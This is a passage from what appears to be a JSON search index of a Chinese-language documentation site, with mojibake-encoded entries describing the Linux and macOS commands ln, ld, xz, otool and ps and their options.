·","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSOF.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSOF.html"},{"title":"ln","text":"åŠŸèƒ½ ç”¨æ¥ä¸ºæ–‡ä»¶åˆ›å»ºé“¾æ¥ï¼Œé“¾æ¥ç±»å‹åˆ†ä¸ºç¡¬é“¾æ¥å’Œç¬¦å·é“¾æ¥ä¸¤ç§ï¼Œé»˜è®¤çš„é“¾æ¥ç±»å‹æ˜¯ç¡¬é“¾æ¥ã€‚å¦‚æœè¦åˆ›å»ºç¬¦å·é“¾æ¥å¿…é¡»ä½¿ç”¨\"-s\"é€‰é¡¹ã€‚ æ³¨æ„ï¼šç¬¦å·é“¾æ¥æ–‡ä»¶ä¸æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„æ–‡ä»¶ï¼Œå®ƒçš„è®¸å¤šå±æ€§ä¾èµ–äºæºæ–‡ä»¶ï¼Œæ‰€ä»¥ç»™ç¬¦å·é“¾æ¥æ–‡ä»¶è®¾ç½®å­˜å–æƒé™æ˜¯æ²¡æœ‰æ„ä¹‰çš„ã€‚ é€‰é¡¹å‚æ•° lné€‰é¡¹å‚æ•° é€‰é¡¹ è¯´æ˜ --backup[=CONTROL] ä¸ºæ¯ä¸ªå·²å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶åˆ›å»ºå¤‡ä»½æ–‡ä»¶ -b ç±»ä¼¼--backupï¼Œä½†ä¸æ¥å—ä»»ä½•å‚æ•° -d, -F, --directory åˆ›å»ºæŒ‡å‘ç›®å½•çš„ç¡¬é“¾æ¥(åªé€‚ç”¨äºè¶…çº§ç”¨æˆ·) -f, --force å¼ºè¡Œåˆ é™¤ä»»ä½•å·²å­˜åœ¨çš„ç›®æ ‡æ–‡ä»¶ -i, --interactive è¦†ç›–æ—¢æœ‰æ–‡ä»¶ä¹‹å‰å…ˆè¯¢é—®ç”¨æˆ·ï¼› -L, --logical å–æ¶ˆå¼•ç”¨ä½œä¸ºç¬¦å·é“¾æ¥çš„ç›®æ ‡ -n, --no-dereference æŠŠç¬¦å·é“¾æ¥çš„ç›®çš„ç›®å½•è§†ä¸ºä¸€èˆ¬æ–‡ä»¶ï¼› -P, --physical ç›´æ¥å°†ç¡¬é“¾æ¥åˆ°ç¬¦å·é“¾æ¥ -r, --relative åˆ›å»ºç›¸å¯¹äºé“¾æ¥ä½ç½®çš„ç¬¦å·é“¾æ¥ -s, --symbolic å¯¹æºæ–‡ä»¶å»ºç«‹ç¬¦å·é“¾æ¥ï¼Œè€Œéç¡¬é“¾æ¥ï¼› -S, --suffix=SUFFIX ç”¨\"-b\"å‚æ•°å¤‡ä»½ç›®æ ‡æ–‡ä»¶åï¼Œå¤‡ä»½æ–‡ä»¶çš„å­—å°¾ä¼šè¢«åŠ ä¸Šä¸€ä¸ªå¤‡ä»½å­—ç¬¦ä¸²ï¼Œé¢„è®¾çš„å¤‡ä»½å­—ç¬¦ä¸²æ˜¯ç¬¦å·\"~\"ï¼Œç”¨æˆ·å¯é€šè¿‡\"-S\"å‚æ•°æ¥æ”¹å˜å®ƒï¼› -t, --target-directory=DIRECTORY æŒ‡å®šè¦åœ¨å…¶ä¸­åˆ›å»ºé“¾æ¥çš„DIRECTORY -T, --no-target-directory å°†\"LINK_NAME\"è§†ä¸ºå¸¸è§„æ–‡ä»¶ -v, --verbose æ‰“å°æ¯ä¸ªé“¾æ¥æ–‡ä»¶çš„åç§° --help æ˜¾ç¤ºæ­¤å¸®åŠ©ä¿¡æ¯å¹¶é€€å‡º --version æ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯å¹¶é€€å‡º æ³¨è§£ å¸¸ç”¨: ln -snf $src $dist","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Liaoning.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Liaoning.html"},{"title":"ld","text":"ldï¼ˆLink eDitorï¼‰å‘½ä»¤æ˜¯äºŒè¿›åˆ¶å·¥å…·é›† GNU Binutils çš„ä¸€å‘˜ï¼Œ æ˜¯ GNU é“¾æ¥å™¨ï¼Œç”¨äºå°†ç›®æ ‡æ–‡ä»¶ä¸åº“é“¾æ¥ä¸ºå¯æ‰§è¡Œæ–‡ä»¶æˆ–åº“æ–‡ä»¶ è¯­æ³•: ld [OPTIONS] OBJFILES ld å‘½ä»¤æ”¯æŒä¼—å¤šé“¾æ¥é€‰é¡¹ï¼Œä½†æ˜¯å¤§éƒ¨åˆ†é€‰é¡¹å¾ˆå°‘è¢«ä½¿ç”¨ï¼Œä¸‹é¢æ˜¯ GNU ld å‘½ä»¤æ¥å—çš„é€‰é¡¹ -b <input-format> æŒ‡å®šç›®æ ‡ä»£ç è¾“å…¥æ–‡ä»¶çš„æ ¼å¼ -B static åªä½¿ç”¨é™æ€åº“ -B dynamic åªä½¿ç”¨åŠ¨æ€åº“ -B symbolic æŠŠå¼•ç”¨æ†ç»‘åˆ°å…±äº«åº“ä¸­çš„å…¨å±€ç¬¦å· -c <MRI-commandfile> , --mri-script= <MRI-commandfile> ä¸ºä¸ MRI é“¾æ¥å™¨å…¼å®¹ï¼Œld æ¥å—ç”± MRI å‘½ä»¤è¯­è¨€ç¼–å†™çš„è„šæœ¬æ–‡ä»¶ --cref åˆ›å»ºè·¨å¼•ç”¨è¡¨ -d , -d c , -d p å³ä½¿æŒ‡å®šäº†å¯é‡å®šä½çš„è¾“å‡ºæ–‡ä»¶ï¼ˆä½¿ç”¨-rï¼‰ï¼Œä¹Ÿä¼šä¸ºå…¬å…±ç¬¦å·åˆ†é…ç©ºé—´ã€‚è„šæœ¬å‘½ä»¤\"FORCE_COMMON_ALLOCATION\"å…·æœ‰ç›¸åŒçš„æ•ˆæœ -d efsym åœ¨è¾“å‡ºæ–‡ä»¶ä¸­åˆ›å»ºæŒ‡å®šçš„å…¨å±€ç¬¦å· -d emangle åœ¨é”™è¯¯æ¶ˆæ¯ä¸­è¿˜åŸç¬¦å·åç§° -e <entry> ä½¿ç”¨æŒ‡å®šçš„ç¬¦å·ä½œä¸ºç¨‹åºçš„åˆå§‹æ‰§è¡Œç‚¹ -E , --export-dynamic å¯¹äºELFæ ¼å¼æ–‡ä»¶ï¼Œåˆ›å»ºåŠ¨æ€é“¾æ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼ŒæŠŠæ‰€æœ‰ç¬¦å·æ·»åŠ åˆ°åŠ¨æ€ç¬¦å·è¡¨ -f <name> , --auxiliary= <name> å¯¹äº ELF æ ¼å¼å…±äº«å¯¹è±¡ï¼Œè®¾ç½® DT_AUXILIARY åç§° -F <name> , --filter= <name> å¯¹äºELFæ ¼å¼å…±äº«å¯¹è±¡ï¼Œè®¾ç½® DT_FILTER åç§°ã€‚è¿™å‘Šè¯‰åŠ¨æ€é“¾æ¥å™¨ï¼Œæ­£åœ¨åˆ›å»ºçš„å…±äº«å¯¹è±¡çš„ç¬¦å·è¡¨åº”è¯¥ç”¨ä½œå…±äº«å¯¹è±¡åç§°çš„ç¬¦å·è¡¨çš„ç­›é€‰å™¨ã€‚ -g è¢«å¿½ç•¥ã€‚ç”¨äºæä¾›å’Œå…¶ä»–å·¥å…·çš„å…¼å®¹æ€§ -h å¯¹äº ELF æ ¼å¼å…±äº«å¯¹è±¡ï¼Œè®¾ç½® DT_SONAME åç§° -I <file> , --dynamic-linker= <file> æŒ‡å®šåŠ¨æ€é“¾æ¥å™¨ã€‚è¿™ä»…åœ¨ç”Ÿæˆä¾èµ–åŠ¨æ€é“¾æ¥åº“çš„ ELF å¯æ‰§è¡Œæ–‡ä»¶æ—¶æ‰æœ‰æ„ä¹‰ã€‚é»˜è®¤çš„åŠ¨æ€é“¾æ¥å™¨é€šå¸¸æ˜¯æ­£ç¡®çš„ï¼Œé™¤éæ‚¨çŸ¥é“æ­£åœ¨åšä»€ä¹ˆï¼Œå¦åˆ™ä¸è¦ä½¿ç”¨è¯¥é€‰é¡¹ã€‚ -l <namespec> , --library= <namespec> æŠŠæŒ‡å®šçš„åº“æ–‡ä»¶æ·»åŠ åˆ°è¦é“¾æ¥çš„æ–‡ä»¶æ¸…å• -L <searchdir> , --library-path= searchdir æŠŠæŒ‡å®šçš„è·¯å¾„æ·»åŠ æ·»åŠ åˆ°æœç´¢åº“çš„ç›®å½•æ¸…å• -M , --print-map æ˜¾ç¤ºé“¾æ¥æ˜ å°„ï¼Œç”¨äºè¯Šæ–­ç›®çš„ -m <emulation> æ¨¡æ‹ŸæŒ‡å®šçš„é“¾æ¥å™¨ -N , --omagic æŒ‡å®šè¯»å–/å†™å…¥æ–‡æœ¬å’Œæ•°æ®æ®µ -n , --nmagic å…³é—­èŠ‚çš„é¡µé¢å¯¹é½ï¼Œå¹¶ç¦ç”¨å¯¹å…±äº«åº“çš„é“¾æ¥ã€‚å¦‚æœè¾“å‡ºæ ¼å¼æ”¯æŒUnixæ ·å¼çš„å¹»æ•°ï¼Œåˆ™å°†è¾“å‡ºæ ‡è®°ä¸º\"NMAGIC\" -n oinhibit-exec ç”Ÿæˆè¾“å‡ºæ–‡ä»¶ï¼Œå³ä½¿å‡ºç°éè‡´å‘½é“¾æ¥é”™è¯¯ã€‚é€šå¸¸ï¼Œå¦‚æœé“¾æ¥å™¨åœ¨é“¾æ¥è¿‡ç¨‹ä¸­é‡åˆ°é”™è¯¯ï¼Œå®ƒå°†ä¸ä¼šç”Ÿæˆè¾“å‡ºæ–‡ä»¶ã€‚ -n o-keep-memory ld é€šå¸¸åœ¨å†…å­˜ä¸­ç¼“å­˜è¾“å…¥æ–‡ä»¶çš„ç¬¦å·è¡¨æ¥ä¼˜åŒ–å†…å­˜ä½¿ç”¨é€Ÿåº¦ã€‚æ­¤é€‰é¡¹å‘Šè¯‰ ld ä¸è¦ç¼“å­˜ç¬¦å·è¡¨ã€‚å½“é“¾æ¥å¤§å‹å¯æ‰§è¡Œæ–‡ä»¶æ—¶ï¼Œå¦‚æœldè€—å°½å†…å­˜ç©ºé—´ï¼Œåˆ™å¯èƒ½éœ€è¦ä½¿ç”¨è¯¥é€‰é¡¹ -O <level> å¯¹äºéé›¶çš„ä¼˜åŒ–ç­‰çº§ï¼Œldå°†ä¼˜åŒ–è¾“å‡ºã€‚æ­¤æ“ä½œä¼šæ¯”è¾ƒè€—æ—¶ï¼Œåº”è¯¥åœ¨ç”Ÿæˆæœ€ç»ˆçš„ç»“æœæ—¶ä½¿ç”¨ã€‚ -o <output> , --output= <output> æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„åç§°. ä½¿ç”¨ format=<output-format> æŒ‡å®šè¾“å‡ºæ–‡ä»¶çš„äºŒè¿›åˆ¶æ ¼å¼ -R <filename> , --just-symbols= <filename> ä»æŒ‡å®šçš„æ–‡ä»¶è¯»å–ç¬¦å·åç§°å’Œåœ°å€ -r , --relocatable ç”Ÿæˆå¯é‡å®šä½çš„è¾“å‡ºï¼ˆç§°ä¸ºéƒ¨åˆ†è¿æ¥ï¼‰ -S , --strip-debug å¿½ç•¥æ¥è‡ªè¾“å‡ºæ–‡ä»¶çš„è°ƒè¯•å™¨ç¬¦å·ä¿¡æ¯ -s , --strip-all å¿½ç•¥æ¥è‡ªè¾“å‡ºæ–‡ä»¶çš„æ‰€æœ‰ç¬¦å·ä¿¡æ¯ -s hared , -B shareable åˆ›å»ºå…±äº«åº“ -t , --trace åœ¨å¤„ç†è¾“å…¥æ–‡ä»¶æ—¶æ˜¾ç¤ºå®ƒä»¬çš„åç§° -u <symbol> , --undefined= <symbol> å¼ºåˆ¶æŒ‡å®šç¬¦å·åœ¨è¾“å‡ºæ–‡ä»¶ä¸­ä½œä¸ºæœªå®šä¹‰ç¬¦å· -v , -V , --version ç¤ºldç‰ˆæœ¬å· -w arn-common å½“ä¸€ä¸ªé€šç”¨ç¬¦å·å’Œå¦ä¸€ä¸ªé€šç”¨ç¬¦å·ç»“åˆæ—¶å‘å‡ºè­¦å‘Š -w arn-constructors å¦‚æœæ²¡æœ‰ä½¿ç”¨ä»»ä½•å…¨å±€æ„é€ å™¨ï¼Œåˆ™å‘å‡ºè­¦å‘Š -w arn-once å¯¹äºæ¯ä¸ªæœªå®šä¹‰çš„ç¬¦å·åªå‘å‡ºä¸€æ¬¡è­¦å‘Š -w arn-section-align å¦‚æœä¸ºäº†å¯¹é½è€Œæ”¹åŠ¨äº†è¾“å‡ºæ®µåœ°å€ï¼Œåˆ™å‘å‡ºè­¦å‘Š --whole-archive å¯¹äºæŒ‡å®šçš„å­˜æ¡£æ–‡ä»¶ï¼Œåœ¨å­˜æ¡£ä¸­åŒ…å«æ‰€æœ‰æ–‡ä»¶ -X , --discard-locals åˆ é™¤æ‰€æœ‰æœ¬åœ°ä¸´æ—¶ç¬¦å· -x , --discard-al åˆ é™¤æ‰€æœ‰æœ¬åœ°ç¬¦å· å…¶ä»–: -Map <mapfile>: å°†é“¾æ¥æ˜ å°„è¾“å‡ºåˆ°æŒ‡å®šçš„æ–‡ä»¶ -rpath=<dir> è®¾ç½®è¿è¡Œæ—¶å…±äº«åº“çš„æœç´¢è·¯å¾„ -rpath-link=<dir> è®¾ç½®é“¾æ¥æ—¶å…±äº«åº“çš„æœç´¢è·¯å¾„ -split-by-file[=size] ä¸ºæ¯ä¸ªç›®æ ‡æ–‡ä»¶åœ¨è¾“å‡ºæ–‡ä»¶ä¸­åˆ›å»ºé¢å¤–çš„æ®µå¤§å°è¾¾åˆ°sizeã€‚sizeé»˜è®¤ä¸º1 -split-by-reloc[=count] æŒ‰ç…§æŒ‡å®šçš„é•¿åº¦åœ¨è¾“å‡ºæ–‡ä»¶ä¸­åˆ›å»ºé¢å¤–çš„æ®µ --section-start=<sectionname>=<org> åœ¨è¾“å‡ºæ–‡ä»¶ä¸­æŒ‡å®šçš„åœ°å€å®šä½æŒ‡å®šçš„æ®µ -T <scriptfile>, --script=<scriptfile> ä½¿ç”¨ scriptfile ä½œä¸ºé“¾æ¥å™¨è„šæœ¬ã€‚æ­¤è„šæœ¬å°†æ›¿æ¢ ld çš„é»˜è®¤é“¾æ¥å™¨è„šæœ¬ï¼ˆè€Œä¸æ˜¯æ·»åŠ åˆ°å…¶ä¸­ï¼‰ï¼Œå› æ­¤è„šæœ¬å¿…é¡»æŒ‡å®šè¾“å‡ºæ–‡ä»¶æ‰€éœ€çš„æ‰€æœ‰å†…å®¹ã€‚å¦‚æœå½“å‰ç›®å½•ä¸­ä¸å­˜åœ¨è„šæœ¬æ–‡ä»¶ï¼Œld ä¼šåœ¨ -L é€‰é¡¹æŒ‡å®šçš„ç›®å½•ä¸­æŸ¥æ‰¾ -Ttext=<org> ä½¿ç”¨æŒ‡å®šçš„åœ°å€ä½œä¸ºæ–‡æœ¬æ®µçš„èµ·å§‹ç‚¹ -Tdata=<org> ä½¿ç”¨æŒ‡å®šçš„åœ°å€ä½œä¸ºæ•°æ®æ®µçš„èµ·å§‹ç‚¹ -Tbss=<org> ä½¿ç”¨æŒ‡å®šçš„åœ°å€ä½œä¸ºbssæ®µçš„èµ·å§‹ç‚¹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-London.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-London.html"},{"title":"xz","text":"é«˜å‹ç¼©ç‡çš„å·¥å…·, ä½¿ç”¨ LZMA2 å‹ç¼©ç®—æ³•ï¼Œ ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶æ¯” POSIX å¹³å°ä¼ ç»Ÿä½¿ç”¨çš„ gzipã€bzip2 ç”Ÿæˆçš„å‹ç¼©æ–‡ä»¶æ›´å°ï¼Œ è€Œä¸”è§£å‹ç¼©é€Ÿåº¦ä¹Ÿå¾ˆå¿«ï¼Œå‹ç¼©æˆ–è§£å‹ç¼©xzæ–‡ä»¶ è¯­æ³•: xz [OPTION]... [FILE]... å‚æ•°: -z , --compress å¼ºåˆ¶å‹ç¼© -d , --decompress , --uncompress force decompression, è§£å‹ -t , --test æµ‹è¯•å‹ç¼©æ–‡ä»¶çš„å®Œæ•´æ€§ -l , --list åˆ—å‡ºæœ‰å…³.xzæ–‡ä»¶çš„ä¿¡æ¯ -k , --keep ä¿ç•™ï¼ˆä¸è¦åˆ é™¤ï¼‰è¾“å…¥æ–‡ä»¶ -f , --force å¼ºåˆ¶è¦†ç›–è¾“å‡ºæ–‡ä»¶å’Œï¼ˆè§£ï¼‰å‹ç¼©é“¾æ¥ -c , --stdout , --to-stdout å†™å…¥æ ‡å‡†è¾“å‡ºï¼Œä¸è¦åˆ é™¤è¾“å…¥æ–‡ä»¶ ä½¿ç”¨7-9ä¹‹å‰è§£å‹ç¼©å†…å­˜ä½¿ç”¨é‡è€ƒè™‘åœ¨å†…ï¼ -e , --extreme å°è¯•é€šè¿‡ä½¿ç”¨æ›´å¤šçš„CPUæ—¶é—´æ¥æé«˜å‹ç¼©æ¯”; è¦æ±‚ä¸å½±å“è§£å‹ç¼©å­˜å‚¨å™¨ -q , --quiet æŠ‘åˆ¶è­¦å‘Š; æŒ‡å®šä¸¤æ¬¡ä»¥æŠ‘åˆ¶é”™è¯¯ -v , --verbose å†—é•¿; æŒ‡å®šä¸¤æ¬¡æ›´è¯¦ç»† -h , --help æ˜¾ç¤ºè¿™ä¸ªç®€æ´çš„å¸®åŠ©å¹¶é€€å‡º -H , --long-help æ˜¾ç¤ºæ›´å¤šå¸®åŠ©ï¼ˆè¿˜åˆ—å‡ºäº†é«˜çº§é€‰é¡¹ï¼‰ -V , --version æ˜¾ç¤ºç‰ˆæœ¬å·å¹¶é€€å‡ºs -T , --threads= <NUM> æœ€å¤šä½¿ç”¨NUMä¸ªçº¿ç¨‹; é»˜è®¤å€¼ä¸º1; set to 0 è®¾ç½®ä¸º0ï¼Œä½¿ç”¨ä¸å¤„ç†å™¨å†…æ ¸ä¸€æ ·å¤šçš„çº¿ç¨‹ -0 ... -9 å‹ç¼©é¢„è®¾; é»˜è®¤ä¸º6; å–å‹ç¼©æœº*å’Œ*","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Now.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Now.html"},{"title":"otool","text":"macä¸‹æŒ‡ä»¤, ç±»ä¼¼linuxçš„ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/ldd å¦‚æŸ¥çœ‹vimçš„é“¾æ¥: otool -L /usr/bin/vim -f print the fat headers -a print the archive header -h print the mach header -l print the load commands -L print shared libraries used -D print shared library id name -t print the text section (disassemble with -v) -p <routine name> start dissassemble from routine name -s <segname sectname> print contents of section -d print the data section -o print the Objective-C segment -r print the relocation entries -S print the table of contents of a library -T print the table of contents of a dynamic shared library -M print the module table of a dynamic shared library -R print the reference table of a dynamic shared library -I print the indirect symbol table -H print the two-level hints table -G print the data in code table -v print verbosely (symbolically) when possible -V print disassembled operands symbolically -c print argument strings of a core file -X print no leading addresses or headers -m don't use archive(member) syntax -B force Thumb disassembly (ARM objects only) -q use llvm's disassembler (the default) -Q use otool(1)'s disassembler -j print opcode bytes -C print linker optimization hints å…¶ä»–: -mcpu=<arg> use `arg' as the cpu for disassembly â€“version print the version of otool","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OTOOL-(MAC).html"},{"title":"ps","text":"ç”¨äºæŠ¥å‘Šå½“å‰ç³»ç»Ÿçš„è¿›ç¨‹çŠ¶æ€. å¯ä»¥æ­é…killæŒ‡ä»¤éšæ—¶ä¸­æ–­ã€åˆ é™¤ä¸å¿…è¦çš„ç¨‹åºã€‚ pså‘½ä»¤æ˜¯æœ€åŸºæœ¬åŒæ—¶ä¹Ÿæ˜¯éå¸¸å¼ºå¤§çš„è¿›ç¨‹æŸ¥çœ‹å‘½ä»¤ï¼Œ ä½¿ç”¨è¯¥å‘½ä»¤å¯ä»¥ç¡®å®šæœ‰å“ªäº›è¿›ç¨‹æ­£åœ¨è¿è¡Œå’Œè¿è¡Œçš„çŠ¶æ€ã€ è¿›ç¨‹æ˜¯å¦ç»“æŸã€è¿›ç¨‹æœ‰æ²¡æœ‰åƒµæ­»ã€å“ªäº›è¿›ç¨‹å ç”¨äº†è¿‡å¤šçš„èµ„æºç­‰ç­‰ï¼Œ æ€»ä¹‹å¤§éƒ¨åˆ†ä¿¡æ¯éƒ½æ˜¯å¯ä»¥é€šè¿‡æ‰§è¡Œè¯¥å‘½ä»¤å¾—åˆ°. é€‰é¡¹: -a æ˜¾ç¤ºæ‰€æœ‰ç»ˆç«¯æœºä¸‹æ‰§è¡Œçš„ç¨‹åºï¼Œé™¤äº†é˜¶æ®µä½œä¸šé¢†å¯¼è€…ä¹‹å¤–ã€‚ a æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬å…¶ä»–ç”¨æˆ·çš„ç¨‹åºã€‚ -A æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºã€‚ -c æ˜¾ç¤ºCLSå’ŒPRIæ ä½ã€‚ c åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºçœŸæ­£çš„æŒ‡ä»¤åç§°ï¼Œè€Œä¸åŒ…å«è·¯å¾„ï¼Œé€‰é¡¹æˆ–å¸¸é©»æœåŠ¡çš„æ ‡ç¤ºã€‚ -C<æŒ‡ä»¤åç§°> æŒ‡å®šæ‰§è¡ŒæŒ‡ä»¤çš„åç§°ï¼Œå¹¶åˆ—å‡ºè¯¥æŒ‡ä»¤çš„ç¨‹åºçš„çŠ¶å†µã€‚ -d æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºï¼Œä½†ä¸åŒ…æ‹¬é˜¶æ®µä½œä¸šé¢†å¯¼è€…çš„ç¨‹åºã€‚ -e æ­¤é€‰é¡¹çš„æ•ˆæœå’ŒæŒ‡å®š\"A\"é€‰é¡¹ç›¸åŒã€‚ e åˆ—å‡ºç¨‹åºæ—¶ï¼Œæ˜¾ç¤ºæ¯ä¸ªç¨‹åºæ‰€ä½¿ç”¨çš„ç¯å¢ƒå˜é‡ã€‚ -f æ˜¾ç¤ºUID,PPIP,Cä¸STIMEæ ä½ã€‚ f ç”¨ASCIIå­—ç¬¦æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨è¾¾ç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚ -g<ç¾¤ç»„åç§°> æ­¤é€‰é¡¹çš„æ•ˆæœå’ŒæŒ‡å®š\"-G\"é€‰é¡¹ç›¸åŒï¼Œå½“äº¦èƒ½ä½¿ç”¨é˜¶æ®µä½œä¸šé¢†å¯¼è€…çš„åç§°æ¥æŒ‡å®šã€‚ g æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºï¼ŒåŒ…æ‹¬ç¾¤ç»„é¢†å¯¼è€…çš„ç¨‹åºã€‚ -G<ç¾¤ç»„è¯†åˆ«ç > åˆ—å‡ºå±äºè¯¥ç¾¤ç»„çš„ç¨‹åºçš„çŠ¶å†µï¼Œä¹Ÿå¯ä½¿ç”¨ç¾¤ç»„åç§°æ¥æŒ‡å®šã€‚ h ä¸æ˜¾ç¤ºæ ‡é¢˜åˆ—ã€‚ -H æ˜¾ç¤ºæ ‘çŠ¶ç»“æ„ï¼Œè¡¨ç¤ºç¨‹åºé—´çš„ç›¸äº’å…³ç³»ã€‚ -jæˆ–j é‡‡ç”¨å·¥ä½œæ§åˆ¶çš„æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ -læˆ–l é‡‡ç”¨è¯¦ç»†çš„æ ¼å¼æ¥æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ L åˆ—å‡ºæ ä½çš„ç›¸å…³ä¿¡æ¯ã€‚ -mæˆ–m æ˜¾ç¤ºæ‰€æœ‰çš„æ‰§è¡Œç»ªã€‚ n ä»¥æ•°å­—æ¥è¡¨ç¤ºUSERå’ŒWCHANæ ä½ã€‚ -N æ˜¾ç¤ºæ‰€æœ‰çš„ç¨‹åºï¼Œé™¤äº†æ‰§è¡ŒpsæŒ‡ä»¤ç»ˆç«¯æœºä¸‹çš„ç¨‹åºä¹‹å¤–ã€‚ -p<ç¨‹åºè¯†åˆ«ç > æŒ‡å®šç¨‹åºè¯†åˆ«ç ï¼Œå¹¶åˆ—å‡ºè¯¥ç¨‹åºçš„çŠ¶å†µã€‚ p<ç¨‹åºè¯†åˆ«ç > æ­¤é€‰é¡¹çš„æ•ˆæœå’ŒæŒ‡å®š\"-p\"é€‰é¡¹ç›¸åŒï¼Œåªåœ¨åˆ—è¡¨æ ¼å¼æ–¹é¢ç¨æœ‰å·®å¼‚ã€‚ r åªåˆ—å‡ºç°è¡Œç»ˆç«¯æœºæ­£åœ¨æ‰§è¡Œä¸­çš„ç¨‹åºã€‚ -s<é˜¶æ®µä½œä¸š> æŒ‡å®šé˜¶æ®µä½œä¸šçš„ç¨‹åºè¯†åˆ«ç ï¼Œå¹¶åˆ—å‡ºéš¶å±è¯¥é˜¶æ®µä½œä¸šçš„ç¨‹åºçš„çŠ¶å†µã€‚ s é‡‡ç”¨ç¨‹åºä¿¡å·çš„æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ S åˆ—å‡ºç¨‹åºæ—¶ï¼ŒåŒ…æ‹¬å·²ä¸­æ–­çš„å­ç¨‹åºèµ„æ–™ã€‚ -t<ç»ˆç«¯æœºç¼–å·> æŒ‡å®šç»ˆç«¯æœºç¼–å·ï¼Œå¹¶åˆ—å‡ºå±äºè¯¥ç»ˆç«¯æœºçš„ç¨‹åºçš„çŠ¶å†µã€‚ t<ç»ˆç«¯æœºç¼–å·> æ­¤é€‰é¡¹çš„æ•ˆæœå’ŒæŒ‡å®š\"-t\"é€‰é¡¹ç›¸åŒï¼Œåªåœ¨åˆ—è¡¨æ ¼å¼æ–¹é¢ç¨æœ‰å·®å¼‚ã€‚ -T æ˜¾ç¤ºç°è¡Œç»ˆç«¯æœºä¸‹çš„æ‰€æœ‰ç¨‹åºã€‚ -u<ç”¨æˆ·è¯†åˆ«ç > æ­¤é€‰é¡¹çš„æ•ˆæœå’ŒæŒ‡å®š\"-U\"é€‰é¡¹ç›¸åŒã€‚ u ä»¥ç”¨æˆ·ä¸ºä¸»çš„æ ¼å¼æ¥æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ -U<ç”¨æˆ·è¯†åˆ«ç > åˆ—å‡ºå±äºè¯¥ç”¨æˆ·çš„ç¨‹åºçš„çŠ¶å†µï¼Œä¹Ÿå¯ä½¿ç”¨ç”¨æˆ·åç§°æ¥æŒ‡å®šã€‚ U<ç”¨æˆ·åç§°> åˆ—å‡ºå±äºè¯¥ç”¨æˆ·çš„ç¨‹åºçš„çŠ¶å†µã€‚ v é‡‡ç”¨è™šæ‹Ÿå†…å­˜çš„æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ x æ˜¾ç¤ºæ‰€æœ‰ç¨‹åºï¼Œä¸ä»¥ç»ˆç«¯æœºæ¥åŒºåˆ†ã€‚ X é‡‡ç”¨æ—§å¼çš„Linux i386ç™»é™†æ ¼å¼æ˜¾ç¤ºç¨‹åºçŠ¶å†µã€‚ å…³äºps çš„ statçŠ¶æ€è§£é‡Š çŠ¶æ€è¯´æ˜: X æ­»æ‰çš„è¿›ç¨‹ï¼ˆæœªå¼€å¯ï¼‰ < é«˜ä¼˜å…ˆçº§ N ä½ä¼˜å…ˆçº§ L æœ‰äº›é¡µè¢«é”è¿›å†…å­˜ï¼Œæœ‰è®°å¿†ä½“çš„åˆ†é¡µåˆ†é…å¹¶é”åœ¨è®°å¿†ä½“å†… s åŒ…å«å­è¿›ç¨‹ï¼ŒæŸä¸€ä¸ªä¼šè¯çš„Leaderè¿›ç¨‹ \\+ ä½äºåå°çš„è¿›ç¨‹ç»„ï¼Œå±äºæŸä¸ªå‰å°ç»„çš„è¿›ç¨‹ l å¤šçº¿ç¨‹ï¼Œå…‹éš†çº¿ç¨‹ multi-threaded (using CLONE_THREAD, like NPTL pthreads do) WCHAN æ­£åœ¨ç­‰å¾…çš„è¿›ç¨‹èµ„æº D ä¸å¯ä¸­æ–­çš„è¿›ç¨‹ï¼Œä¸å¯ä¸­æ–­ç¡çœ ï¼ˆé€šå¸¸æ˜¯åœ¨IOæ“ä½œï¼‰æ”¶åˆ°ä¿¡å·ä¸å”¤é†’å’Œä¸å¯è¿è¡Œï¼Œè¿›ç¨‹å¿…é¡»ç­‰å¾…ç›´åˆ°æœ‰ä¸­æ–­å‘ç”Ÿ R æ­£åœ¨æ‰§è¡Œä¸­ï¼Œæ­£åœ¨è¿è¡Œæˆ–å¯è¿è¡Œï¼ˆåœ¨è¿è¡Œé˜Ÿåˆ—æ’é˜Ÿä¸­ï¼‰ S é™æ­¢çŠ¶æ€ï¼Œå¯ä¸­æ–­ç¡çœ ï¼ˆä¼‘çœ ä¸­ï¼Œå—é˜»ï¼Œåœ¨ç­‰å¾…æŸä¸ªæ¡ä»¶çš„å½¢æˆæˆ–æ¥å—åˆ°ä¿¡å·ï¼‰ T æš‚åœæ‰§è¡Œ Z 